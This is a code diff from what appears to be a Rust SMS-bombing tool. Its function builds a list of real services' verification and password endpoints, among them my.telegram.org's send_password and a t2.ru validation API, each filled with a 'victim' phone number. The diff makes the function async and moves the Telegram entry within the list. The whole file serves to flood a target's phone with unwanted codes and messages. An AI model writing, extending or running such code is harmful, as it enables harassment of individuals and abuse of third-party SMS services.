@@ -65,31 +65,11 @@ pub struct Victim {
 /// }
 
 /// List of SMS services and services messages
-pub fn construct_services_list(victim: Victim) -> Vec<Service> {
+pub async fn construct_services_list(victim: Victim) -> Vec<Service> {
     let mut services = Vec::new();
 
     match victim.phone.country {
         Country::Ru => {
-            // Telegram
-            {
-                let mut service = Service {
-                    name: "Telegram".to_string(),
-                    service_type: ServiceType::ServiceMessage,
-                    method: Method::POST,
-                    url: "https://my.telegram.org/auth/send_password".to_string(),
-                    headers: HeaderMap::new(),
-                    body_type: BodyType::Form,
-                    body: Default::default(),
-                };
-
-                let mut phone = victim.phone.clone();
-                phone.format(WithPlus);
-                service.body = json!({
-                    "phone": phone.phone
-                });
-
-                services.push(service);
-            }
             // 4lapy
             {
                 let mut service = Service {
@@ -281,7 +261,7 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                         "https://msk.t2.ru/api/validation/number/{}",
                         victim.phone.clone().phone
                     )
-                        .to_string(),
+                    .to_string(),
                     headers: HeaderMap::new(),
                     body_type: BodyType::JSON,
                     body: Default::default(),
@@ -446,6 +426,26 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
             }
 
             // Telegram
+            // Telegram
+            {
+                let mut service = Service {
+                    name: "Telegram".to_string(),
+                    service_type: ServiceType::ServiceMessage,
+                    method: Method::POST,
+                    url: "https://my.telegram.org/auth/send_password".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::Form,
+                    body: Default::default(),
+                };
+
+                let mut phone = victim.phone.clone();
+                phone.format(WithPlus);
+                service.body = json!({
+                    "phone": phone.phone
+                });
+
+                services.push(service);
+            }
             // spot.uz
             {
                 let mut service = Service {
